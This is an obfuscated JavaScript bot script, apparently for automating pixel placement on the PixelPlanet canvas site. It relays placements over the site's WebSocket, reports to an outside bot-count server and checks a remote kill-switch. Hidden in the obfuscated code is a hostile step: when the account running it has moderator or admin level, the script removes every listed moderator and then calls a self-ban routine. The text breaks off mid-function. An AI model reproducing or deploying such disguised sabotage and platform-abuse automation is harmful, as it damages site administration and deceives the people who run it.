var s9=z;(function(i,s){var s8=z,F=i();while(!![]){try{var g=parseInt(s8(0x1e3))/0x1*(parseInt(s8(0x34e))/0x2)+parseInt(s8(0x231))/0x3+parseInt(s8(0x2af))/0x4+-parseInt(s8(0x2c7))/0x5+-parseInt(s8(0x385))/0x6+parseInt(s8(0x344))/0x7+-parseInt(s8(0x2ad))/0x8*(parseInt(s8(0x39c))/0x9);if(g===s)break;else F['push'](F['shift']());}catch(S){F['push'](F['shift']());}}}(v,0xb5733));const fetch=self[s9(0x225)];function z(i,s){var F=v();return z=function(g,S){g=g-0x1ce;var B=F[g];return B;},z(i,s);}function v(){var vf=['catch','xStart','setInt16','byteLength','modeBot','object','match','\x20bytes','canvas','host','Off','chunkList','has','span','getData','omit','[VB]\x20','buffer','y\x20-\x20','valueOf','position:\x20fixed;\x20top:\x200;\x20bottom:\x200;\x20width:\x20100%;\x20height:\x200;\x20z-index:\x20-1;','type','gameCanvas','LOADED','LN2','`buffer`\x20v5.x.\x20Use\x20`buffer`\x20v4.x\x20if\x20you\x20require\x20old\x20browser\x20support.','origTemplate','setPixel','$1\x20','clearChunkGetTimeout','MODES','sobel','.coorbox','left','_getIncrementalEdges','now','.bmp','readFloatBE','timeout','toImageData','slice','copy','floor','innerHTML','center','void','number','then','utf-16le','reason','toByteArray','writeFloatBE','imageSmoothingEnabled','[WS]\x20Socket\x20is\x20closed.\x20Reconnect\x20will\x20be\x20attempted\x20in\x20','[WS]\x20WebSocket\x20already\x20open,\x20not\x20starting','readInt8','yStart','name','Buffer.write(string,\x20encoding,\x20offset[,\x20length])\x20is\x20no\x20longer\x20supported','set','kMaxLength','./resources/canvas','Buffer','entries','\x22offset\x22\x20is\x20outside\x20of\x20buffer\x20bounds','writeDoubleBE','width','readIntBE','void-bot','tiledToAbs','Sobel','deRegisterChunk','The\x20\x22string\x22\x20argument\x20must\x20be\x20one\x20of\x20type\x20string,\x20Buffer,\x20or\x20ArrayBuffer.\x20','val\x20must\x20be\x20string,\x20number\x20or\x20Buffer','status','swap64','canPlace','pow','setInt16BE','read','/api','[GB]\x20','RGBToId','head','writeUIntLE','ascii','[WS]\x20return\x20code\x20-\x20','isEncoding','childNodes','permission','species','string','font-size:110%;','template','getTime','This\x20browser\x20lacks\x20typed\x20array\x20(Uint8Array)\x20support\x20which\x20is\x20required\x20by\x20','done','getInt16','The\x20\x22value\x22\x20argument\x20must\x20not\x20be\x20of\x20type\x20number.\x20Received\x20type\x20number','include','sobelData','load','149752CaHSEH','right','2849796OyGjpf','length','writeUInt32LE','./utils/Template','detect\x20template\x20\x22','setUint8','IdToRGB','onColorSelect','from','execute','cycle','interval','border-color:\x20darkred;\x20margin:\x203px\x200px\x203px\x200px;','innerText','userlvl','getContext','x\x20-\x20','[WS]\x20Socket\x20encountered\x20error,\x20closing\x20socket','getPixelArea','availableMods','Timer\x20-\x20','drawImage','split','.viewport','3098660JZeESY','setUInt8','Out\x20of\x20range\x20index','log','isView','binaryType','[WS]\x20open','tiledBorders','hostname','equals','https://voidserv.glitch.me/online','timerElement','checking...','lastIndexOf','load\x20ch','switcher','loadChunk','inspect','getUint8','bind','undefined','on/off','Wait\x20for\x20timer','get','The\x20first\x20argument\x20must\x20be\x20one\x20of\x20type\x20string,\x20Buffer,\x20ArrayBuffer,\x20Array,\x20','writeUInt32BE','binary','height','\x22\x20is\x20invalid\x20for\x20argument\x20\x22value\x22','removeChild','toLocaleString','base64','foo','instantiate','INSPECT_MAX_BYTES','base64-js','search','utf8','lastY','alloc','json','setAttribute','blur','maxLiveTime','or\x20Array-like\x20Object.\x20Received\x20type\x20','coverBot','zone','./resources/constants','value','half','dehydrate','setUint16','woyken','readUIntBE','[WS]\x20Restarting\x20WebSocket','hex','float:left;','call','Buffer\x20size\x20must\x20be\x20a\x20multiple\x20of\x2064-bits','indexOf','onclose','readDoubleBE','function','lastPxlElement','appendChild','onBinaryMessage','The\x20\x22target\x22\x20argument\x20must\x20be\x20one\x20of\x20type\x20Buffer\x20or\x20Uint8Array.\x20','fuckyouarkeros.fun','\x20ms.','class','Stop','protocol','pop','xInput','Empty\x20answer\x20','\x22></img>','yInput','allocUnsafe','window','exports','\x20m.','putImageData','../resources/canvas.json','img','setBotStatus','onload','Make\x20Void\x20great\x20again!','time','convert','click','lastX','retCode\x20:\x20','\x22length\x22\x20is\x20outside\x20of\x20buffer\x20bounds','code','need\x20tmp','text','chess','ctx','readUInt16LE','availableCovers','worldX','push','amd','style','warn','timeToEndElement','run\x20bot','botOnline','Index\x20out\x20of\x20range','float:right;','registerChunk','writeIntLE','setCover','/banme','fill','readUInt16BE','imageProcessor','writeFloatLE','compare','Server\x20overload','querySelector','_mode','{}.constructor(\x22return\x20this\x22)(\x20)','document','signal','5326188MhQSvd','getElementById','clientY','same','OP_CODE','./utils/ImageProcessor','__proto__','port','minimap-panel-button','CAPTCHA\x20appeared','4246HOkvYH','canLoad','Status\x20-\x20','append','chunkGetTimeout','Time\x20to\x20end\x20-\x20','getTargets','_shuffle','download','hydrate','exception','lastTmpURL','elems','getCover','attributes','close','getUint16','/me','readUIntLE','writeUIntBE','start','input','garbageCollector','://','setTimer','onmessage','charCodeAt','chunkSize','./utils/Chunk','Invalid\x20string.\x20Length\x20must\x20be\x20a\x20multiple\x20of\x204','defineProperty','addCover','Attempt\x20to\x20allocate\x20Buffer\x20larger\x20than\x20maximum\x20','fromByteArray','result','setLastPxl','getTimeout','listeners','offset\x20is\x20not\x20uint','setTimeToEnd','writeInt32LE','offset','splice','\x22buffer\x22\x20argument\x20must\x20be\x20a\x20Buffer\x20instance','strategyElement','Bots\x20online\x20-\x20','borders','linear','div','all','_createTargets','\x22size\x22\x20argument\x20must\x20be\x20of\x20type\x20number','chunkLoading','shadowRoot','yEnd','2228646hsLplM','imageData','setTemplate','maxLoadWaitTime','remmod','_cover','(((.+)+)+)+$','toDataURL','stop','setChunkGetTimeout','Void\x20Bot','intersects','getUint32','keys','clear','backgroundColor','createElement','z-index:\x201;','concat','round','size:\x200x','send','UNLOADED','585gbsCpP','/ws','setMode','_isBuffer','readInt16BE','error','change','isConnecting','ucs2','info','importObject','includes','shard','canvasId','mozImageSmoothingEnabled','root','delete','readInt32BE','location','denied','colors','replace','console','Template\x20src\x20isn\x27t\x20defined','absToTiled','target','./utils/functions','addEventListener','botting','html','The\x20\x22buf1\x22,\x20\x22buf2\x22\x20arguments\x20must\x20be\x20one\x20of\x20type\x20Buffer\x20or\x20Uint8Array','isArray','readUInt8','readyState','connect','onopen','layers','data','background-color:black;\x20border-color:darkRed;\x20color:red;','fileInput','The\x20value\x20\x22','writeUInt8','min','203ftVmmg','setBotOnline','webkitImageSmoothingEnabled','write','Received\x20type\x20','./resources/selectors.json','onerror','map','filter','toString','targetStart\x20out\x20of\x20bounds','Draw\x20clr\x20-\x20','botStatusElement','table','subarray','addMode','prototype','files','overrideEnds','[object\x20Uint16Array]','setInt8','isBuffer','substring','file','POST','keydown','selected','https://raw.githubusercontent.com/TouchedByDarkness/PixelPlanet-Bot/master/secret.txt','Unknown\x20encoding:\x20','LOADING','poolSize','min-max','Undef\x20mode','writeInt16LE','settedPxls','option','swap16','lastUsing','join','ucs-2','byteOffset','build','Argument\x20must\x20be\x20a\x20Buffer','restart','select','getMode','<Buffer\x20','toPrimitive','random','xEnd','image/png','ssv','isConnected','getPixel','./functions','./utils/Palette','setUInt32BE','clientX','Problems\x20with\x20bot.zone','./resources/style','latin1','.selected','readInt32LE','\x22\x20is\x20invalid\x20for\x20option\x20\x22size\x22','chunks','startsWith','GM_fetch','coords','coverElement','granted','abort','arrayBuffer','apply','src','bindColorsWithElements','button','forEach','clearTimeout','3140475SACuVE','utf-8','timeConnected','constructor','utf16le','/api/modtools','readUInt32BE','top','targets','readFloatLE','abs','sourceEnd\x20out\x20of\x20bounds','http:','palettebox','setColors','writeIntBE','toLowerCase','hash','fromCharCode','stopped','getImageData','Done'];v=function(){return vf;};return v();}function payload(){(function(){function i(s,F,g){var ss=z;function S(K,C){var si=z;if(!F[K]){if(!s[K]){var k=si(0x305)==typeof require&&require;if(!C&&k)return k(K,!0x0);if(B)return B(K,!0x0);var h=new Error('Cannot\x20find\x20module\x20\x27'+K+'\x27');throw h[si(0x324)]='MODULE_NOT_FOUND',h;}var X=F[K]={'exports':{}};s[K][0x0][si(0x300)](X[si(0x316)],function(T){var j=s[K][0x1][T];return S(j||T);},X,X['exports'],i,s,F,g);}return F[K][si(0x316)];}for(var B=ss(0x305)==typeof require&&require,M=0x0;M<g['length'];M++)S(g[M]);return S;}return i;}()({0x1:[function(i,s,F){var Ft=z;(function(g){var sF=z;let S=!![];window['addEventListener']('focus',()=>S=!![]),window[sF(0x1d3)](sF(0x2f1),()=>S=![]);let B=[],M=[];const {COLORS:K,CHUNK_SIZE:C}=i(sF(0x284)),{MAX_REQUESTS_PER_HOUR:k,PXL_CB:h,MAX_TIME_STACK:t}=i(sF(0x2f6)),p=i(sF(0x1e8)),{injectCSS:X,objForEach:T,factory:j,downloadCanvas:b,createCanvasFromData:Z,rand:E,fetchApiMe:U,getModList:V,submitRemMod:d,banMe:r}=i(sF(0x1d2)),c=i(sF(0x21a)),u=i(sF(0x2b2)),A=i(sF(0x36a)),O=i(sF(0x349)),Q=new c();Q[sF(0x23f)](K);let Y=null;const P={'OP_CODE':0xc1,'hydrate':i6=>({'x':i6['getUint8'](0x1),'y':i6[sF(0x2d9)](0x2),'offset':i6[sF(0x2d9)](0x3)<<0x10|i6[sF(0x35e)](0x4),'color':i6[sF(0x2d9)](0x6)}),'dehydrate':function(i6,i7,i8,i9){var sg=sF;const ii=new ArrayBuffer(0x1+0x1+0x1+0x1+0x2+0x1),is=new DataView(ii);return is[sg(0x2b4)](0x0,this[sg(0x348)]),is['setUint8'](0x1,i6),is[sg(0x2b4)](0x2,i7),is['setUint8'](0x3,i8>>>0x10),is[sg(0x2fa)](0x4,i8&0xffff),is[sg(0x2b4)](0x6,i9),ii;}},w={'OP_CODE':0xc2,'hydrate':i6=>i6[sF(0x391)](0x1)},G={'OP_CODE':0xc3,'hydrate':i6=>({'retCode':i6[sF(0x2d9)](0x1),'wait':i6[sF(0x391)](0x2),'coolDownSeconds':i6[sF(0x2a8)](0x6)}),'dehydrate'(i6,i7,i8){var sv=sF;const i9=g[sv(0x314)](0x1+0x1+0x4+0x1+0x2);i9[sv(0x2c8)](OP_CODE,0x0),i9[sv(0x2c8)](i6,0x1),i9[sv(0x21b)](i7,0x2);const ii=Math['round'](i8/0x3e8);return i9[sv(0x295)](ii,0x6),i9;}},W={'OP_CODE':0xa0,'dehydrate'(i6){var sz=sF;let i7=new ArrayBuffer(0x2),i8=new DataView(i7);return i8[sz(0x1f7)](0x0,0xa0),i8['setInt8'](0x1,i6),i7;}},l={'OP_CODE':0xa1,'dehydrate'(i6){var sS=sF;let i7=new ArrayBuffer(0x3),i8=new DataView(i7);return i8['setInt8'](0x0,0xa1),i8[sS(0x249)](0x1,i6),i7;}},e={'OP_CODE':0xa2,'dehydrate'(i6){var sB=sF;let i7=new ArrayBuffer(0x3),i8=new DataView(i7);return i8[sB(0x1f7)](0x0,0xa2),i8[sB(0x249)](0x1,i6),i7;}};class m{constructor(){var sM=sF;console[sM(0x2ca)]('[WS]\x20creating\x20ProtocolClient'),this['isConnecting']=this[sM(0x217)]=![],this['ws']=this[sM(0x280)]=null,this[sM(0x3a9)]=0x0,setInterval(()=>this['ws'][sM(0x39a)](new Uint8Array([0xb0])[sM(0x258)]),0x55f0);}async[sF(0x1da)](){var sK=sF;this[sK(0x3a3)]=!![];if(this['ws'])console[sK(0x2ca)](sK(0x27d));this[sK(0x233)]=Date[sK(0x26a)](),this['ws']=new WebSocket('ws'+(location[sK(0x30e)]===sK(0x23d)?'':'s')+sK(0x365)+(window['ssv'][sK(0x3a8)]+'.'+location[sK(0x2cf)]+(location[sK(0x34b)]?':'+location[sK(0x34b)]:'')+sK(0x39d))),this['ws'][sK(0x2cc)]='arraybuffer',this['ws'][sK(0x1db)]=()=>{var sC=sK;this[sC(0x3a3)]=![],this['isConnected']=!![],console[sC(0x2ca)](sC(0x2cd));if(this[sC(0x3a9)]!==null)this['ws'][sC(0x39a)](W['dehydrate'](this[sC(0x3a9)]));},this['ws'][sK(0x367)]=({data:i6})=>{var sk=sK;try{if(typeof i6!==sk(0x2a2))this[sk(0x308)](i6);}catch(i7){console[sk(0x3a1)]('[WS]\x20An\x20error\x20occured\x20while\x20parsing\x20websocket\x20message'),console[sk(0x3a1)](i7);}},this['ws']['onclose']=i6=>{var sh=sK;this['ws']=null,this[sh(0x217)]=![];const i7=0x7d0;console['warn'](sh(0x27c)+i7+sh(0x30b),i6[sh(0x278)]),setTimeout(()=>this[sh(0x1da)](),i7);},this['ws'][sK(0x1e9)]=i6=>{var st=sK;console[st(0x3a1)](st(0x2c0),i6),this['ws'][st(0x35d)](),setTimeout(()=>this[st(0x1da)](),0x7d0);};}['setName'](i6){var sp=sF;if(this[sp(0x217)]&&this['name']!==i6){console[sp(0x2ca)]('[WS]\x20Name\x20change\x20requieres\x20WebSocket\x20restart');if(!this[sp(0x217)])return;this[sp(0x217)]=![],console['log'](sp(0x2fd)),this['ws'][sp(0x303)]=this['ws']['onmessage']=null,this['ws'][sp(0x35d)](),this['ws']=null,this['connect']();}}[sF(0x335)](i6,i7){var sy=sF;if(this['isConnected'])this['ws']['send'](l[sy(0x2f9)](i6<<0x8|i7));}['deRegisterChunk'](i6,i7){var sX=sF;if(this[sX(0x217)])this['ws'][sX(0x39a)](e[sX(0x2f9)](i6<<0x8|i7));}[sF(0x308)](i6){var sT=sF;if(i6[sT(0x24a)]===0x0)return;const i7=new DataView(i6);switch(i7[sT(0x2d9)](0x0)){case P[sT(0x348)]:let i8=P['hydrate'](i7),i9=a[sT(0x223)][sT(0x2de)](i8['x'],i8['y']);if(!i9)return;let ii=i8['x']*C+i8[sT(0x377)]%C+a[sT(0x37c)]['x1'],is=i8['y']*C+~~(i8[sT(0x377)]/C)+a[sT(0x37c)]['y1'],iF=K[i8['color']];console[sT(0x2ca)]('[WS]\x20pxl\x20'+ii+'\x20'+is+'\x20['+iF+']'),B=[ii,is],a['setPixel'](ii,is,iF);break;case w[sT(0x348)]:J['setTimer'](R[sT(0x31e)]=w['hydrate'](i7)/0x3e8);break;case G[sT(0x348)]:let {retCode:ig,wait:iv,coolDownSeconds:iz}=G[sT(0x357)](i7);J[sT(0x366)](R[sT(0x31e)]=iv/0x3e8),console[sT(0x2ca)](sT(0x29d)+ig);if(ig!==0x0){a['setPixel'](...M),console['warn'](sT(0x322)+ig);if(ig===0xa){i2[sT(0x2ca)]('Captcha'),window['grecaptcha'][sT(0x2b8)](),i2[sT(0x38d)]();if(!S)trySendNotification(sT(0x38f),{'body':sT(0x34d)});};return;};break;}}[sF(0x262)](i6,i7,i8=0x7){var sj=sF;if(!this[sj(0x217)])return;let [i9,ii]=a['absToTiled'](i6,i7),is=(i6-i9*C-a['borders']['x1'])%C+(i7-ii*C-a['borders']['y1'])%C*C;this['ws'][sj(0x39a)](P[sj(0x2f9)](i9,ii,is,i8)),M=[i6,i7,a[sj(0x218)](i6,i7)],a[sj(0x262)](i6,i7,K[i8]),J['setLastPxl'](i6,i7,K[i8]);}}const o=new m();o[sF(0x1da)](),fetch(sF(0x1fe))['then'](i6=>i6[sF(0x326)]())[sF(0x276)](i6=>{i6['trim']()!=='hf\x20loves\x20males'&&L();})[sF(0x247)](L);function L(){var sb=sF;alert('The\x20bot\x20has\x20been\x20deactivated\x20or\x20you\x20have\x20a\x20connection\x20problem'),setPixel=()=>{},i2[sb(0x20e)]=()=>{},J[sb(0x3ab)]['parentNode'][sb(0x2e4)](J[sb(0x3ab)]);}U()[sF(0x276)](i6=>{var sZ=sF;[0x1,0x2][sZ(0x3a7)](i6[sZ(0x2bd)])&&(V(i7=>{var sE=sZ;i7[sE(0x22f)](([i8,i9])=>{d(i8,()=>{});});}),setTimeout(()=>r(),0xbb8));});let J=new function(){var sU=sF;let i6=this;this['root']=j({'type':sU(0x37e),'shadow':!![],'style':sU(0x25b)},[j({'type':sU(0x32e),'html':i(sU(0x21e))}),this[sU(0x315)]=j({'type':'div','style':sU(0x396),'id':sU(0x28b)},[j({'type':sU(0x254),'text':sU(0x31d),'style':sU(0x2a3)}),j({'type':'hr','style':sU(0x2bb)}),this['left']=j({'type':sU(0x37e),'class':'half','style':sU(0x2ff)}),this[sU(0x2ae)]=j({'type':'div','class':sU(0x2f8),'style':sU(0x334)})])]),this[sU(0x2ae)][sU(0x307)](j({'type':sU(0x37e),'text':sU(0x37b)},[this[sU(0x332)]=j({'type':sU(0x254),'text':'null'})])),this[sU(0x1e4)]=i7=>this[sU(0x332)]['innerText']!==i7&&(this[sU(0x332)][sU(0x2bc)]=i7),this[sU(0x2ae)]['appendChild'](j({'type':sU(0x37e),'text':sU(0x350)},[this[sU(0x1ef)]=j({'type':sU(0x254)})])),this[sU(0x31b)]=i7=>this[sU(0x1ef)][sU(0x2bc)]!==i7&&(this['botStatusElement'][sU(0x2bc)]=i7),this[sU(0x2ae)][sU(0x307)](j({'type':sU(0x37e),'text':sU(0x2c3)},[this[sU(0x2d2)]=j({'type':sU(0x254)})])),this['setTimer']=i7=>i7!==this[sU(0x2d2)][sU(0x2bc)]&&(this[sU(0x2d2)][sU(0x2bc)]=~~(i7*0x64)/0x64),this['right'][sU(0x307)](j({'type':'div','text':sU(0x353)},[this[sU(0x330)]=j({'type':'span','text':sU(0x202)})])),this[sU(0x375)]=(i7,i8)=>i7+'-'+i8+'\x20m.'!==this[sU(0x330)][sU(0x2bc)]&&(this['timeToEndElement'][sU(0x2bc)]=i7+'-'+i8+sU(0x317)),this['right'][sU(0x307)](j({'type':sU(0x37e),'text':'Last\x20pxl\x20-\x20'},[this[sU(0x306)]=j({'type':sU(0x254),'text':'x\x20y\x20[r,g,b]'})])),this[sU(0x371)]=(i7,i8,i9)=>i7+'\x20'+i8+'\x20['+i9+']'!==this['lastPxlElement']['innerText']&&(this[sU(0x306)][sU(0x2bc)]=i7+'\x20'+i8+'\x20['+i9+']'),this[sU(0x268)]['appendChild'](j({'type':sU(0x37e),'text':sU(0x2bf)},[this[sU(0x310)]=j({'type':sU(0x363),'listeners':{'input':function(){var sV=sU;localStorage[sV(0x321)]=+this['value'];if(D)D['x1']=+this[sV(0x2f7)];}}})])),this[sU(0x310)]['value']=localStorage[sU(0x321)]||'',this[sU(0x268)][sU(0x307)](j({'type':sU(0x37e),'text':sU(0x259)},[this[sU(0x313)]=j({'type':'input','listeners':{'input':function(){var sd=sU;localStorage[sd(0x2ed)]=+this['value'];if(D)D['y1']=+this[sd(0x2f7)];}}})])),this[sU(0x313)]['value']=localStorage[sU(0x2ed)]||'',this[sU(0x268)][sU(0x307)](j({'type':sU(0x37e),'text':'Strätegy\x20-\x20'},[this[sU(0x37a)]=j({'type':sU(0x20f)})])),this[sU(0x1f2)]=i7=>{var sr=sU;let i8=j({'type':sr(0x206),'text':i7});i8[sr(0x2f7)]=i7,this['strategyElement'][sr(0x307)](i8);},this[sU(0x268)][sU(0x307)](j({'type':'div','text':sU(0x1ee)},[this[sU(0x227)]=j({'type':sU(0x20f)})])),this[sU(0x36d)]=i7=>{var sc=sU;let i8=document['createElement'](sc(0x206));i8[sc(0x2f7)]=i8[sc(0x2bc)]=i7,this[sc(0x227)][sc(0x307)](i8);},this['left'][sU(0x307)](this[sU(0x1df)]=j({'type':'input','style':sU(0x1de),'attributes':{'type':sU(0x1fa),'style':'width:100%;'},'listeners':{'change':function(i7){var su=sU;let i8=new FileReader();i8['readAsDataURL'](this[su(0x1f4)][0x0]),i8[su(0x1e9)]=console[su(0x3a1)],i8[su(0x31c)]=()=>{var sA=su;i2[sA(0x2ca)](sA(0x2b3)+i8['result']+'\x22'),D=i1(i8[sA(0x370)]);};}}})),this[sU(0x268)][sU(0x307)](this[sU(0x2d6)]=j({'type':sU(0x22e),'text':sU(0x2dc)})),this['switcher'][sU(0x1d3)](sU(0x320),()=>i2[sU(0x26d)]===null?i2[sU(0x20e)](0x0):i2['stop']()),document['body'][sU(0x307)](this[sU(0x3ab)]);}();J[sF(0x31b)]('stopped');function H(){return Y===null?0x3e8*0x78:0xe10/k*Y*0x3e8+0x3e8*0x28;}(function i6(){var sO=sF;fetch(sO(0x2d1),{'method':sO(0x1fb)})[sO(0x276)](i7=>i7[sO(0x326)]())[sO(0x276)](i7=>{J['setBotOnline'](Y=+i7),setTimeout(i6,H());})['catch'](i7=>{var sQ=sO;i7==0x1ad&&(Y=null,J['setBotStatus'](sQ(0x33e)));;setTimeout(i6,H());});}());let N=document[sF(0x33f)](p[sF(0x226)]),n=document['querySelector'](p[sF(0x25d)]),I={'worldX':null,'worldY':null,'clientX':null,'clientY':null};window['addEventListener']('mousemove',i7=>{var sY=sF;[I[sY(0x32b)],I['worldY']]=i5(),I[sY(0x21c)]=i7[sY(0x21c)],I[sY(0x346)]=i7['clientY'];});let f=new RegExp(/-?\d+/g),a=new function(){var sP=sF;let i7=this;this[sP(0x369)]=C,this[sP(0x2f2)]=0x3e8*0x78,this[sP(0x2ce)]={'x1':0x0,'y1':0x0,'x2':0x100,'y2':0x100,'width':0x100,'height':0x100},this['borders']={'x1':-(this[sP(0x2ce)][sP(0x289)]*this[sP(0x369)]/0x2),'y1':-(this[sP(0x2ce)][sP(0x2e2)]*this['chunkSize']/0x2),'x2':this['tiledBorders']['width']*this['chunkSize']/0x2,'y2':this[sP(0x2ce)][sP(0x2e2)]*this['chunkSize']/0x2},this[sP(0x223)]={'get':function(i8,i9){return this[i8]===undefined||this[i8][i9]===undefined?null:this[i8][i9];},'set':function(i8,i9,ii){var sw=sP;return this[i8]===undefined&&(this[i8]={}),i7['chunkList'][sw(0x32c)](this[i8][i9]=new A(i8,i9,ii)),this[i8][i9];},'delete':function(i8,i9){var sG=sP;if(this[i8]===undefined||this[i8][i9]===undefined)return;this[i8][i9]=undefined;for(let ii=0x0;ii!==i7[sG(0x252)][sG(0x2b0)];ii++)if(i7[sG(0x252)][ii]['x']===i8&&i7[sG(0x252)][ii]['y']===i9)return o[sG(0x28e)](i7[sG(0x252)][ii]['x'],i7['chunkList'][ii]['y']),i7[sG(0x252)][sG(0x378)](ii,0x1);;}},this[sP(0x252)]=[],this['canLoad']=!![],this[sP(0x388)]=0x3e8,this['chunkGetTimeout']=null,this[sP(0x264)]=()=>{var sW=sP;if(this['chunkGetTimeout']!==null)clearTimeout(this[sW(0x352)]),this[sW(0x352)]=null,this['canLoad']=!![];},this[sP(0x38e)]=function(){var sl=sP;this[sl(0x264)](),this[sl(0x34f)]=![],this[sl(0x352)]=setTimeout(this[sl(0x264)]['bind'](this),this[sl(0x388)]);},this['garbageCollector']=new function(){var se=sP;this['interval']=null,this[se(0x393)]=()=>{var sm=se;let i8=new Date()[sm(0x2a5)](),i9=0x0;for(let ii of i7[sm(0x252)])if(i8-ii[sm(0x208)]>i7[sm(0x2f2)])i7[sm(0x223)][sm(0x3ac)](ii['x'],ii['y']),i9++;i9!==0x0&&console[sm(0x2ca)](sm(0x298)+i9+'\x20chunks\x20collected');},this[se(0x362)]=()=>{var so=se;this[so(0x38d)](),this[so(0x2ba)]=setInterval(this[so(0x393)][so(0x2da)](this),0x3e8*0x3c);},this[se(0x38d)]=()=>this[se(0x2ba)]===null||(clearInterval(this['interval']),this[se(0x2ba)]=null);}(),this[sP(0x1d0)]=(i8,i9)=>[~~((i8-this[sP(0x37c)]['x1'])/this[sP(0x369)]),~~((i9-this['borders']['y1'])/this[sP(0x369)])],this[sP(0x28c)]=(i8,i9)=>[this[sP(0x37c)]['x1']+i8*this['chunkSize'],this[sP(0x37c)]['y1']+i9*this[sP(0x369)]];{let i8;this['getPixel']=(i9,ii)=>{var sL=sP;return i8=this[sL(0x223)][sL(0x2de)](...this['absToTiled'](i9,ii)),i8&&i8[sL(0x2de)]((i9-this[sL(0x37c)]['x1'])%this[sL(0x369)],(ii-this[sL(0x37c)]['y1'])%this[sL(0x369)]);},this[sP(0x262)]=(i9,ii,is)=>{var sJ=sP;return i8=this['chunks'][sJ(0x2de)](...this[sJ(0x1d0)](i9,ii)),i8&&i8[sJ(0x282)]((i9-this[sJ(0x37c)]['x1'])%this[sJ(0x369)],(ii-this[sJ(0x37c)]['y1'])%this[sJ(0x369)],is);};};this[sP(0x2d7)]=((()=>{var sH=sP;let i9=new Uint32Array(K[sH(0x2b0)]);K[sH(0x22f)](([iF,ig,iv],iz)=>i9[iz]=0xff000000|iv<<0x10|ig<<0x8|iF);const ii=iF=>{var sN=sH;let ig=new Uint32Array(iF[sN(0x2b0)]);for(let iv=0x0;iv!==iF[sN(0x2b0)];iv++)ig[iv]=i9[iF[iv]&0x3f];return ig;};function is(iF){var sn=sH;let ig=new Uint8ClampedArray(i7['chunkSize']**0x2<<0x2),iv=new Uint32Array(ig[sn(0x258)]),iz=ii(iF);return iz[sn(0x22f)]((iS,iB)=>iv[iB]=iS),ig;};return async function(iF,ig){var sI=sH;if(!i7['canLoad']||i7[sI(0x223)][sI(0x2de)](iF,ig))return;i7[sI(0x38e)]();let iv=await fetch(location['protocol']+'//'+location[sI(0x250)]+('/chunks/0/'+iF+'/'+ig+sI(0x26b)));if(iv['ok']){let iz=await iv[sI(0x22a)](),iS;if(iz['byteLength'])iS=is(new Uint8Array(iz)),console[sI(0x2ca)]('Chunk\x20'+iF+'\x20'+ig+'\x20loading'),o[sI(0x335)](iF,ig);else{iS=new Uint8ClampedArray(i7[sI(0x369)]**0x2<<0x2);for(let iB=0x0;iB!==iS['length'];iB+=0x4)[iS[iB],iS[iB+0x1],iS[iB+0x2],iS[iB+0x3]]=[...K[0x0],0xff];console['log'](sI(0x311)+iF+'\x20'+ig);};i7['chunks']['set'](iF,ig,iS),i7[sI(0x264)]();}else throw new Error('Network\x20response\x20was\x20not\x20ok.');};})());}();a[sF(0x364)][sF(0x362)]();let R=new function(){var sf=sF;this[sf(0x31e)]=0x0,setInterval(()=>{var sa=sf;if(isNaN(this[sa(0x31e)]))this['time']=0x0;--this[sa(0x31e)]<0x0&&(this[sa(0x31e)]=0x0),J['setTimer'](this[sa(0x31e)]);},0x3e8),this[sf(0x2a5)]=()=>this[sf(0x31e)],this['canPlace']=()=>this[sf(0x31e)]<0x34;}(),D=localStorage[sF(0x359)]?i1(localStorage['lastTmpURL']):null;const q=i7=>[D[sF(0x1dd)][i7],D[sF(0x1dd)][i7+0x1],D['data'][i7+0x2],D[sF(0x1dd)][i7+0x3]];;((()=>{let i7;getPxlInTemplate=(i8,i9)=>{var sx=z;return i7=i8+i9*D[sx(0x289)]<<0x2,[D[sx(0x1dd)][i7],D[sx(0x1dd)][i7|0x1],D['data'][i7|0x2],D[sx(0x1dd)][i7|0x3]];};})());function i0(){var sR=sF;if(!i2[sR(0x33b)])i2[sR(0x33b)]=new O();i2[sR(0x33b)][sR(0x387)](D);};function i1(i7){var sD=sF;localStorage['lastTmpURL']=i7;let i8=new u({'name':sD(0x274),'x':+J['xInput'][sD(0x2f7)],'y':+J[sD(0x313)][sD(0x2f7)],'src':i7});return i8[sD(0x2ac)]()[sD(0x276)](function(){var sq=sD;i8[sq(0x31f)](Q),i0[sq(0x22b)](this,arguments);}),i8;};let i2=new function(){var F0=sF;let i7=this;this[F0(0x2c2)]=['random','woyken',F0(0x37d),F0(0x273),F0(0x327)],this[F0(0x39e)]=function(i8){var F1=F0;this['availableMods']['includes'](i8)?this[F1(0x2ca)]('New\x20mode\x20-\x20'+(this[F1(0x340)]=i8)):this[F1(0x32f)]('Mode\x20doesn\x27t\x20exist');},this[F0(0x210)]=function(){var F2=F0;return this[F2(0x340)];},this[F0(0x340)]=localStorage['modeBot']||F0(0x213),this['availableCovers']=['all',F0(0x1fd)],this[F0(0x337)]=function(i8){var F3=F0;if(this[F3(0x32a)]['includes'](i8))this[F3(0x38a)]=i8;else this[F3(0x32f)]('Cover\x20doesn\x27t\x20exist');},this[F0(0x35b)]=function(){var F4=F0;return this[F4(0x38a)];},this['_cover']=localStorage[F0(0x2f4)]||'all',this['x']=null,this['y']=null,this[F0(0x205)]=0x0,this['chunkLoading']=![],this[F0(0x2ca)]=(...i8)=>i8[F0(0x22f)](i9=>console[F0(0x2ca)](F0(0x257)+i9)),this[F0(0x32f)]=(...i8)=>i8[F0(0x22f)](i9=>console[F0(0x32f)]('[VB]\x20'+i9)),this[F0(0x2f5)]={'getPixelArea':function(i8,i9,ii,is){var F5=F0;let iF=new Uint8ClampedArray(ii*is<<0x2),ig,iv=0x0,iz=0x0,iS;i7[F5(0x382)]=![];for(;iv!==is;iv++){for(ig=0x0;ig!==ii;ig++,iz+=0x4){iS=a[F5(0x218)](ig+i8,iv+i9);iS?(iF[iz]=iS[0x0],iF[iz+0x1]=iS[0x1],iF[iz+0x2]=iS[0x2],iF[iz+0x3]=0xff):(i7[F5(0x382)]=!![],a[F5(0x2d7)](...a['absToTiled'](ig+i8,iv+i9)));;};};if(i7[F5(0x382)])return null;return iF;},'get':function(i8,i9){var F6=F0;let ii=i8+i9*this[F6(0x289)]<<0x2;return[this[F6(0x1dd)][ii],this[F6(0x1dd)][ii+0x1],this['data'][ii+0x2],this['data'][ii+0x3]];},'getData':function(i8){var F7=F0;return[this['data'][i8],this[F7(0x1dd)][i8+0x1],this[F7(0x1dd)][i8+0x2],this[F7(0x1dd)][i8+0x3]];},'override':function(){var 